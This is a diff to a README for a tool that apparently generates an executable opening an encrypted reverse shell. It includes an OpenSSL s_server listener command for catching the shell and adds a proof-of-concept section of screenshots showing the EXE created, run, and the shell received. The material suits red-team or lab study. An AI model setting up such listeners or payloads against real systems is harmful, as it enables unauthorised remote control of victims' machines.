@@ -53,3 +53,22 @@ sudo apt-get install mono-complete
    Once the payload is generated, start an OpenSSL listener on your machine to accept the reverse shell connection:
    ```bash
    openssl s_server -accept <Your_Port> -cert reception.pem -key reception.key -quiet
+
+# PoC:
+Creating an EXE file that executes Reverse Shell:
+
+![image](https://github.com/user-attachments/assets/64ff1b49-f1c8-401c-8423-ab851c51c9b9)
+
+
+Running the EXE file, creating an encrypted connection:
+
+![image](https://github.com/user-attachments/assets/1a1bbdc3-b571-4239-a141-04cec47b40ce)
+
+
+Receiving Reverse shell:
+
+![image](https://github.com/user-attachments/assets/640cbfae-fb92-4515-b2bd-7df87bec7cf3)
+
+
+
+
